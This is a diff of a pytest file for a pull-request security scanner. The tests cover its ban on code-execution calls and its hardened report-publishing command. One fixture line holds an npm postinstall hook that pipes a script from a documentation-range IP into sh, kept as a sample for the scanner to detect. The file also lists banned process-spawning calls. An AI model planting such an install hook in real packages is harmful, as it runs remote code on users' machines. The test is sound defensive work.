@@ -16,7 +16,8 @@ import pytest
 
 from pr_scanner import cli
 from pr_scanner.github_client import FetchError
-from pr_scanner.report_io import parse_report
+from pr_scanner.publisher import PublishedRun, PublishError
+from pr_scanner.report_io import parse_report, report_to_json
 from tests.test_fetcher import BASE, HEAD, FakeClient, RAW_ACCEPT, pr_meta, resp, routes_for
 from tests.test_fetcher_engine import CONTENT_KEY, DIFF as WORKFLOW_DIFF, FULL as WORKFLOW_FULL
 
@@ -230,14 +231,21 @@ def test_python_dash_m_entry_point_exists():
 # ---- NFR-01: the scan command never runs anything --------------------------------------------
 
 
-def test_cli_module_has_no_way_to_run_code_or_processes():
-    tree = ast.parse(Path(cli.__file__).read_text(encoding="utf-8"))
-    banned_calls = {"eval", "exec", "compile", "__import__", "system", "popen", "Popen", "run", "call"}
-    banned_imports = {"subprocess", "os.system", "importlib", "runpy", "pickle", "marshal"}
+@pytest.mark.parametrize("module", ["cli", "publisher", "report_io", "reporter", "fetcher", "github_client"])
+def test_modules_have_no_way_to_run_code_or_processes(module):
+    import importlib
+
+    path = importlib.import_module(f"pr_scanner.{module}").__file__
+    tree = ast.parse(Path(path).read_text(encoding="utf-8"))
+    banned_builtins = {"eval", "exec", "compile", "__import__"}  # bare names only; re.compile is fine
+    banned_attrs = {"system", "popen", "Popen", "run", "call", "check_output", "spawn", "execv", "fork"}
+    banned_imports = {"subprocess", "importlib", "runpy", "pickle", "marshal", "ctypes"}
     for node in ast.walk(tree):
         if isinstance(node, ast.Call):
-            name = getattr(node.func, "id", None) or getattr(node.func, "attr", None)
-            assert name not in banned_calls, name
+            if isinstance(node.func, ast.Name):
+                assert node.func.id not in banned_builtins, node.func.id
+            elif isinstance(node.func, ast.Attribute):
+                assert node.func.attr not in banned_attrs, node.func.attr
         if isinstance(node, (ast.Import, ast.ImportFrom)):
             names = [a.name for a in node.names] + ([node.module] if isinstance(node, ast.ImportFrom) and node.module else [])
             assert not banned_imports & set(names), names
@@ -258,3 +266,137 @@ index 1111111..2222222 100644
 +  "scripts": {"postinstall": "curl -s http://203.0.113.9/x.sh | sh"},
    "version": "1.0.0"
 """
+
+
+# ---- report command: the privileged job -----------------------------------------------------
+
+
+class FakePublisher:
+    def __init__(self, error=None):
+        self.error = error
+        self.calls = []
+
+    def publish(self, repo, report):
+        self.calls.append((repo, report))
+        if self.error:
+            raise self.error
+        return PublishedRun(1, "https://github.com/owner/repo/runs/1")
+
+
+def run_report(tmp_path, capsys, *, content=None, publisher=None, env=None, head=HEAD, args=None, path=None):
+    f = path or (tmp_path / "report.json")
+    if content is not None and path is None:
+        f.write_bytes(content if isinstance(content, bytes) else content.encode("utf-8"))
+    pub = publisher or FakePublisher()
+    argv = args if args is not None else ["report", "--repo", "owner/repo", "--head-sha", head, "--report", str(f)]
+    code = cli.main(argv, env={"GITHUB_TOKEN": TOKEN} if env is None else env, publisher_factory=lambda token: pub)
+    return code, pub, capsys.readouterr()
+
+
+def good_json(findings=True) -> str:
+    return report_to_json(cli.run_scan(client_for(diff=_hook_diff() if findings else BENIGN_DIFF), "owner/repo", 7, HEAD))
+
+
+def test_valid_report_is_published_unchanged(tmp_path, capsys):
+    code, pub, cap = run_report(tmp_path, capsys, content=good_json())
+    assert code == 0 and len(pub.calls) == 1
+    repo, report = pub.calls[0]
+    assert repo == "owner/repo" and report == parse_report(good_json())
+    assert "runs/1" in cap.out
+
+
+def test_missing_report_still_produces_a_failing_check(tmp_path, capsys):
+    code, pub, _ = run_report(tmp_path, capsys, path=tmp_path / "nope.json")
+    assert code == 0 and len(pub.calls) == 1
+    report = pub.calls[0][1]
+    assert report.conclusion == "failure" and report.head_sha == HEAD
+    assert "no report" in report.summary.lower()
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "",
+        "not json",
+        "[]",
+        b"\xff\xfe\x00bad utf8",
+        "x" * (3 * 1024 * 1024),
+    ],
+)
+def test_unreadable_or_invalid_report_becomes_a_failing_check(tmp_path, capsys, content):
+    code, pub, _ = run_report(tmp_path, capsys, content=content)
+    assert code == 0 and len(pub.calls) == 1
+    report = pub.calls[0][1]
+    assert report.conclusion == "failure" and "rejected" in report.summary.lower()
+
+
+def test_a_forged_clean_report_for_another_commit_is_rejected(tmp_path, capsys):
+    # the file claims another commit than the event; the event wins
+    other = "c" * 40
+    forged = report_to_json(cli.run_scan(client_for(), "owner/repo", 7, HEAD)).replace(HEAD, other)
+    code, pub, _ = run_report(tmp_path, capsys, content=forged)
+    report = pub.calls[0][1]
+    assert report.head_sha == HEAD and report.conclusion == "failure"
+
+
+def test_forged_markup_in_the_report_is_rejected_not_posted(tmp_path, capsys):
+    import json
+
+    doc = json.loads(good_json())
+    doc["summary"] += "\n\nping @everyone"
+    code, pub, _ = run_report(tmp_path, capsys, content=json.dumps(doc))
+    posted = pub.calls[0][1]
+    assert "@everyone" not in posted.summary and posted.conclusion == "failure"
+
+
+def test_symlinked_report_is_not_followed(tmp_path, capsys):
+    target = tmp_path / "real.json"
+    target.write_text(good_json())
+    link = tmp_path / "link.json"
+    link.symlink_to(target)
+    code, pub, _ = run_report(tmp_path, capsys, path=link)
+    assert pub.calls[0][1].conclusion == "failure"
+
+
+def test_directory_or_special_file_is_not_read(tmp_path, capsys):
+    code, pub, _ = run_report(tmp_path, capsys, path=tmp_path)
+    assert pub.calls[0][1].conclusion == "failure"
+
+
+def test_publish_failure_exits_one_and_never_prints_the_token(tmp_path, capsys):
+    pub = FakePublisher(PublishError("GitHub returned HTTP 403: nope", status=403))
+    code, _, cap = run_report(tmp_path, capsys, content=good_json(), publisher=pub)
+    assert code == 1 and "403" in cap.err
+    assert TOKEN not in cap.out + cap.err
+
+
+def test_unexpected_publisher_exception_exits_one_by_type_only(tmp_path, capsys):
+    pub = FakePublisher(RuntimeError(f"boom {TOKEN}"))
+    code, _, cap = run_report(tmp_path, capsys, content=good_json(), publisher=pub)
+    assert code == 1 and "RuntimeError" in cap.err and TOKEN not in cap.out + cap.err
+
+
+@pytest.mark.parametrize("env", [{}, {"GITHUB_TOKEN": ""}, {"GITHUB_TOKEN": "has space"}])
+def test_report_command_needs_a_token(tmp_path, capsys, env):
+    code, pub, _ = run_report(tmp_path, capsys, content=good_json(), env=env)
+    assert code == 2 and pub.calls == []
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["report"],
+        ["report", "--repo", "owner/repo"],
+        ["report", "--repo", "bad", "--head-sha", HEAD, "--report", "x"],
+        ["report", "--repo", "o/r", "--head-sha", "nothex", "--report", "x"],
+        ["report", "--repo", "o/r", "--head-sha", HEAD, "--report", "x", "--token", TOKEN],
+    ],
+)
+def test_report_command_bad_arguments_exit_two(tmp_path, capsys, args):
+    code, pub, cap = run_report(tmp_path, capsys, args=args)
+    assert code == 2 and pub.calls == [] and TOKEN not in cap.out + cap.err
+
+
+def test_the_event_sha_not_the_file_decides_where_the_check_lands(tmp_path, capsys):
+    code, pub, _ = run_report(tmp_path, capsys, content=good_json(), head=HEAD)
+    assert pub.calls[0][1].head_sha == HEAD
